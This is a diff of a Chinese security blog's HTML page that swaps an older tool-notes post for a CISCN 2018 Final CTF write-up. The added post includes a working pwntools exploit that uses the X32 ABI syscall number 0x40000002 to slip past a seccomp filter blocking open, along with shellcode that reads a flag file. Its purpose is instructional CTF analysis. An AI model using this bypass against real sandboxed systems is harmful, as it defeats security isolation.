@@ -15,24 +15,26 @@
 
 
 
-<meta name="description" content="记录一些工具的使用方法和遇到的问题解决途径">
-<meta name="keywords" content="Questions">
+<meta name="description" content="一些参加全国大学生信息安全竞赛决赛的记录，本来想多吐槽一些的，后来想想算了，别留那么多负能量，不过最后这个颁奖环节我真的忍不了了... 记录一些">
+<meta name="keywords" content="CTF,PWN">
 <meta property="og:type" content="article">
-<meta property="og:title" content="问题解决及工具使用">
-<meta property="og:url" content="http://p4nda.top/2018/03/03/question/index.html">
+<meta property="og:title" content="CISCN 2018 Final赛记">
+<meta property="og:url" content="http://p4nda.top/2018/07/27/CISCN-Final/index.html">
 <meta property="og:site_name" content="p4nda&#39;s blog">
-<meta property="og:description" content="记录一些工具的使用方法和遇到的问题解决途径">
+<meta property="og:description" content="一些参加全国大学生信息安全竞赛决赛的记录，本来想多吐槽一些的，后来想想算了，别留那么多负能量，不过最后这个颁奖环节我真的忍不了了... 记录一些">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://p4nda.top/img/questions/2_1.png">
-<meta property="og:image" content="http://p4nda.top/img/questions/3_1.png">
-<meta property="og:image" content="http://p4nda.top/img/questions/Q1_1.png">
-<meta property="og:image" content="http://p4nda.top/img/questions/Q1_2.png">
-<meta property="og:image" content="http://p4nda.top/img/questions/Q1_4.png">
-<meta property="og:updated_time" content="2018-07-05T13:40:31.052Z">
+<meta property="og:image" content="http://p4nda.top/img/ciscn-final/dubhe.jpg">
+<meta property="og:image" content="http://p4nda.top/img/ciscn-final/1-1.png">
+<meta property="og:image" content="http://p4nda.top/img/ciscn-final/1-2.png">
+<meta property="og:image" content="http://p4nda.top/img/ciscn-final/ppt1.jpg">
+<meta property="og:image" content="http://p4nda.top/img/ciscn-final/ppt2.jpg">
+<meta property="og:image" content="http://p4nda.top/img/ciscn-final/ppt3.jpg">
+<meta property="og:image" content="http://p4nda.top/img/ciscn-final/ppt4.jpg">
+<meta property="og:updated_time" content="2018-07-27T08:20:54.258Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="问题解决及工具使用">
-<meta name="twitter:description" content="记录一些工具的使用方法和遇到的问题解决途径">
-<meta name="twitter:image" content="http://p4nda.top/img/questions/2_1.png">
+<meta name="twitter:title" content="CISCN 2018 Final赛记">
+<meta name="twitter:description" content="一些参加全国大学生信息安全竞赛决赛的记录，本来想多吐槽一些的，后来想想算了，别留那么多负能量，不过最后这个颁奖环节我真的忍不了了... 记录一些">
+<meta name="twitter:image" content="http://p4nda.top/img/ciscn-final/dubhe.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -64,7 +66,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>问题解决及工具使用 | p4nda&#39;s blog</title>
+<title>CISCN 2018 Final赛记 | p4nda&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -303,11 +305,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-question" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-CISCN-Final" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/03/03/question/" class="article-date">
-      <time datetime="2018-03-02T16:00:00.000Z" itemprop="datePublished">2018-03-03</time>
+      <a href="/2018/07/27/CISCN-Final/" class="article-date">
+      <time datetime="2018-07-27T05:26:01.000Z" itemprop="datePublished">2018-07-27</time>
 </a>
 
 
@@ -322,7 +324,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      问题解决及工具使用
+      CISCN 2018 Final赛记
     </h1>
   
 
@@ -333,7 +335,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Questions/">Questions</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -343,56 +345,35 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>记录一些工具的使用方法和遇到的问题解决途径</p>
-<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>github : <a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">https://github.com/david942j/one_gadget</a></p>
-<p>所谓 one_gadget 就是一个实现了直接执行system(‘/bin/sh’)的程序跳板。</p>
-<p>常见的，可以使用one_gadget覆盖劫持got表、返回地址、hook（__malloc_hook、__free_hook）等等操作，也就是当可以劫持控制流后覆盖的捷径</p>
-<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>安装one_gadget需要ruby环境，因为是由ruby写成的。</p>
-<p>以ubuntu为例，首先安装ruby</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ruby</span><br></pre></td></tr></table></figure>
-<p>还需要安装ruby的包管理器</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gem</span><br></pre></td></tr></table></figure>
-<p>依赖安装好了以后就可以安装one_gadget了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gem install one_gadget</span><br></pre></td></tr></table></figure>
-<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>一般针对libc使用，直接one_gadget libc.so就可以了</p>
-<p>输出结果：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─[$] &lt;&gt; one_gadget libc64.so </span><br><span class="line"><span class="number">0x45216</span>	execve(<span class="string">"/bin/sh"</span>, rsp+<span class="number">0x30</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4526a</span>	execve(<span class="string">"/bin/sh"</span>, rsp+<span class="number">0x30</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x30</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xf02a4</span>	execve(<span class="string">"/bin/sh"</span>, rsp+<span class="number">0x50</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x50</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xf1147</span>	execve(<span class="string">"/bin/sh"</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
-<p>当泄露了libc基地址以后再用libc base+offset就可以使用了，但需要注意one_gadget的输出是有一定限制的，如[$rax = NULL]，需要逐个尝试。</p>
-<h2 id="libc-database"><a href="#libc-database" class="headerlink" title="libc database"></a>libc database</h2><p>github: <a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a></p>
-<p>有一些PWN题故意不给libc文件，但是可以泄露地址，libc database可以利用泄露的地址来确定服务器使用的libc。</p>
-<h3 id="安装方法-1"><a href="#安装方法-1" class="headerlink" title="安装方法"></a>安装方法</h3><p>先下载libc database</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/niklasb/libc-database</span><br></pre></td></tr></table></figure>
-<p>利用get来下载流行的libc库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd libc-database</span><br><span class="line">./get</span><br></pre></td></tr></table></figure>
-<p>程序会自动在ubuntu网站上下载相关的libc文件，存储到./db文件夹下</p>
-<p><img src="/img/questions/2_1.png" alt=""></p>
-<h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><p>使用./find可以在db中找到对应libc，如泄露的地址是printf 0xf7xxxx260  puts 0xf7xxxf30，输入最后三位即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./find printf 260 puts f30</span><br><span class="line">archive-glibc (id libc6_2.19-10ubuntu2_i386)</span><br></pre></td></tr></table></figure>
-<h2 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a><strong>seccomp-tools</strong></h2><p>github： <a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">https://github.com/david942j/seccomp-tools</a></p>
-<p>主要是针对linux seccomp沙箱规则的读取</p>
-<h3 id="安装方法-2"><a href="#安装方法-2" class="headerlink" title="安装方法"></a>安装方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure>
-<p>如果遇到报错，可参考下面问题解决…</p>
-<h3 id="使用方法-2"><a href="#使用方法-2" class="headerlink" title="使用方法"></a>使用方法</h3><p>主要就用dump了…</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./xxxx</span><br></pre></td></tr></table></figure>
-<p>比如查看检查到的某通防机制</p>
-<p><img src="/img/questions/3_1.png" alt=""></p>
-<h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><h2 id="ida-“sp-analysis-failed”-错误"><a href="#ida-“sp-analysis-failed”-错误" class="headerlink" title="ida “sp-analysis failed” 错误"></a>ida “sp-analysis failed” 错误</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>具体情况是在分析QWB CTF 2018 比赛中raisepig一题中，发现某些函数在按F5进行反编译时，出现这个问题，导致无法查看反编译代码。</p>
-<p>参考了<a href="http://www.cnblogs.com/echo579/p/6236277.html" target="_blank" rel="noopener">本队大佬的博客</a>以后，解决了问题。</p>
-<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>问题原因貌似是在代码执行中的pop、push操作不匹配，导致ida解析的时候对esp的值产生错误造成的。这种不匹配可能对程序执行并无影响。</p>
-<p><strong>一种可能的解决办法是：</strong> </p>
-<p>首先，在ida中打开栈指针的显示：options-general-stack pointer (勾选)</p>
-<p><img src="/img/questions/Q1_1.png" alt=""></p>
-<p>结果会在原来的地址偏移的旁边，显示函数栈内ESP寄存器的偏移：<br><img src="/img/questions/Q1_2.png" alt=""></p>
-<p>可以看到在出现问题的函数中，retn前的偏移是一个非0值，这回导致ida识别函数出错，<strong>修改的目的就是使这个值为0</strong>，修改办法是使用“ALT + K”快捷键，强行使esp保持平衡，具体操作是：</p>
-<p><strong>在leave这一行（这很重要）</strong>按快捷键“ALT+K”，修改其值为leave前方标志的其ESP偏移值：</p>
-<p><img src="/img/questions/Q1_4.png" alt=""></p>
-<p>当发现，retn前标志的ESP偏移是00时，按F5应该就可以反编译了（<strong>不要care红色的报错，果断的按F5！</strong>）</p>
-<h2 id="gem-“ERROR-Failed-to-build-gem-native-extension-”问题"><a href="#gem-“ERROR-Failed-to-build-gem-native-extension-”问题" class="headerlink" title="gem “ERROR: Failed to build gem native extension.”问题"></a>gem “ERROR: Failed to build gem native extension.”问题</h2><h3 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h3><p>在安装seccomp-tools时，使用</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure>
-<p>命令时，出现报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  ERROR:  Error installing seccomp-tools:  </span><br><span class="line">  ERROR: Failed to build gem native extension.  </span><br><span class="line">  </span><br><span class="line">/System/Library/Frameworks/Ruby.framework/Versions/2.1/usr/bin/ruby  </span><br><span class="line">extconf.rb  </span><br><span class="line">mkmf.rb can&apos;t find header files for ruby at  </span><br><span class="line">/System/Library/Frameworks/Ruby.framework/Versions/2.1/usr/lib/ruby/ruby.h</span><br></pre></td></tr></table></figure>
-<h3 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h3><p>缺少<strong>ruby-dev</strong>，执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get  install   ruby-dev</span><br></pre></td></tr></table></figure>
+        <p>总而言之，我就觉得这次主办方的想法很有问题。尤其是最后在所有选手在场等了一个下午的情况下，没有给参赛队颁奖的环节，反而给什么优秀支撑单位、技术委员会颁了奖。这也是我第一次见过这样的设计，比赛在北京打，颁奖隔两天去武汉颁，谁有精力陪你折腾，而且没有任何通知，真的是mdzz。</p>
+<p><strong><em>//以上戾气有点大，这次比赛还是学了很多东西的，内容有点短，就当我水了一篇吧，实在是有的东西不想说了。后续有些东西可能会发在天枢公众号上，欢迎扫描占板凳。</em></strong></p>
+<p><img src="/img/ciscn-final/dubhe.jpg" alt=""></p>
+<p>我们队分了一道CNSS战队plusls师傅出的一道PWN题，其中有一个seccomp沙箱，里面的逻辑是这样的。</p>
+<p><img src="/img/ciscn-final/1-1.png" alt=""></p>
+<p>看起来，没有什么问题，主要限制了open系列的系统调用，限制了这个以后，shell也没法起了。</p>
+<p>比赛时，没有想到如何过这个限制。第一天打完了以后和plusls师傅交流了一下，感觉是个挺有意思的东西。</p>
+<p>首先，线上赛那个题目逻辑挺复杂的，利用<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">seccomp-tools</a>简单复现了一下逻辑。</p>
+<p>sandbox.asm</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">A = arch</span><br><span class="line">A == ARCH_X86_64 ? next : dead</span><br><span class="line">A = sys_number</span><br><span class="line">A == open ? dead : next</span><br><span class="line">A == mmap ? dead : next</span><br><span class="line">A == ptrace ? dead : next</span><br><span class="line">A == openat ? dead : next</span><br><span class="line">A == open_by_handle_at ? dead : next</span><br><span class="line">return ALLOW</span><br><span class="line">dead:</span><br><span class="line">return KILL</span><br></pre></td></tr></table></figure>
+<p>将沙箱逻辑使用seccomp-tools编译，将其转换为数组：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/pwn/<span class="built_in">test</span>/x32 abi] - [五 7月 27, 16:00]</span><br><span class="line">└─[$] &lt;&gt; seccomp-tools asm sandbox.asm -a amd64  -f carray</span><br><span class="line">unsigned char bpf[] = &#123;32,0,0,0,4,0,0,0,21,0,0,7,62,0,0,192,32,0,0,0,0,0,0,0,21,0,5,0,2,0,0,0,21,0,4,0,9,0,0,0,21,0,3,0,101,0,0,0,21,0,2,0,1,1,0,0,21,0,1,0,48,1,0,0,6,0,0,0,0,0,255,127,6,0,0,0,0,0,0,0&#125;;</span><br><span class="line"></span><br><span class="line">┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/pwn/<span class="built_in">test</span>/x32 abi] - [五 7月 27, 16:00]</span><br><span class="line">└─[$] &lt;&gt; seccomp-tools asm sandbox.asm -a amd64 -f raw | seccomp-tools disasm -</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x05 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0009</span><br><span class="line"> 0004: 0x15 0x04 0x00 0x00000009  <span class="keyword">if</span> (A == mmap) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000065  <span class="keyword">if</span> (A == ptrace) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000101  <span class="keyword">if</span> (A == openat) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000130  <span class="keyword">if</span> (A == open_by_handle_at) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure>
+<p>然后就可以编写程序逻辑了，这里我使用一个简化的demo，直接开沙箱执行shellcode：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sandbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> bpf[] = &#123;<span class="number">32</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">62</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">192</span>,<span class="number">32</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">101</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">48</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>,<span class="number">127</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">sfp</span> = &#123;</span><span class="number">10</span>,bpf&#125;; <span class="comment">//10代表沙箱规则条数</span></span><br><span class="line">	prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;sfp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> * shellcode;</span><br><span class="line">	<span class="keyword">void</span> (*vul)();</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"sandbox init"</span>);</span><br><span class="line"></span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"shellcode:"</span>,<span class="number">0x10</span>);</span><br><span class="line">	shellcode = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_EXEC | PROT_READ |PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	read(<span class="number">0</span>,shellcode,<span class="number">0x1000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"call %p"</span>,shellcode);</span><br><span class="line">	vul = shellcode;</span><br><span class="line">	sandbox();</span><br><span class="line">	vul();</span><br><span class="line">	<span class="comment">//shellcode();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时，可以发现程序无法打开文件。</p>
+<p>利用赛后交流时提到的X32 ABI，我后来搜索了一下，比较早出现这个东西的是BCTF的一道PWN题，和这个类似。看了一下发现这个东西方法是一个系统调用的两个调用号，官方的说法是0x40000000置了一个标准位。</p>
+<p>然后，利用这一点，在调用open时，使用0x40000002，这个调用号就可以绕过沙箱，读出flag了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, endian = <span class="string">'little'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./vul"</span>)</span><br><span class="line"><span class="comment">#sgdb.attach(p)</span></span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line">shellcode+= shellcraft.write(<span class="number">1</span>,<span class="string">"input:"</span>,<span class="number">0x6</span>)</span><br><span class="line">shellcode+= shellcraft.read(<span class="number">0</span>,<span class="number">0x601200</span>,<span class="number">0x20</span>)</span><br><span class="line">shellcode+= <span class="string">'''    mov edi, 0x1010101 /* 6296064 == 0x601200 */</span></span><br><span class="line"><span class="string">    xor edi, 0x1611301</span></span><br><span class="line"><span class="string">    xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">    xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">    /* call open() */</span></span><br><span class="line"><span class="string">    push 0x40000002 /* 2 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall\n</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">shellcode+= shellcraft.read(<span class="number">3</span>,<span class="number">0x601200</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode+= shellcraft.write(<span class="number">1</span>,<span class="number">0x601200</span>,<span class="number">0x100</span>)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.recvuntil(<span class="string">'input:'</span>)</span><br><span class="line">p.send(<span class="string">'./flag\0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/img/ciscn-final/1-2.png" alt=""></p>
+<p>参考：</p>
+<p><a href="https://sites.google.com/site/x32abi/" target="_blank" rel="noopener">https://sites.google.com/site/x32abi/</a></p>
+<p><a href="https://blog.csdn.net/qq_29343201/article/details/72627528" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/72627528</a></p>
+<p><a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">https://github.com/david942j/seccomp-tools</a></p>
+<p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
+<p>最后附上PPT</p>
+<p><img src="/img/ciscn-final/ppt1.jpg" alt=""></p>
+<p><img src="/img/ciscn-final/ppt2.jpg" alt=""></p>
+<p><img src="/img/ciscn-final/ppt3.jpg" alt=""></p>
+<p><img src="/img/ciscn-final/ppt4.jpg" alt=""></p>
 
       
     </div>
@@ -401,13 +382,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/03/03/question/">问题解决及工具使用</a></p>
+        <p><span>本文标题:</span><a href="/2018/07/27/CISCN-Final/">CISCN 2018 Final赛记</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">P4nda</a></p>
-        <p><span>发布时间:</span>2018-03-03, 00:00:00</p>
-        <p><span>最后更新:</span>2018-07-05, 21:40:31</p>
+        <p><span>发布时间:</span>2018-07-27, 13:26:01</p>
+        <p><span>最后更新:</span>2018-07-27, 16:20:54</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/03/03/question/" title="问题解决及工具使用">http://p4nda.top/2018/03/03/question/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://p4nda.top/2018/03/03/question/　　作者: P4nda" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/07/27/CISCN-Final/" title="CISCN 2018 Final赛记">http://p4nda.top/2018/07/27/CISCN-Final/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://p4nda.top/2018/07/27/CISCN-Final/　　作者: P4nda" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -419,16 +400,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/03/06/hgame/">
-                    HGAME 2018 PWN题记录
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/02/05/hitctf/">
-                    HITCTF 2018 PWN 题记录
+                <a href="/2018/07/20/0ctf-baby/">
+                    【kernel pwn】0ctf 2018 final baby题解
                 </a>
             </div>
         
@@ -440,7 +415,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
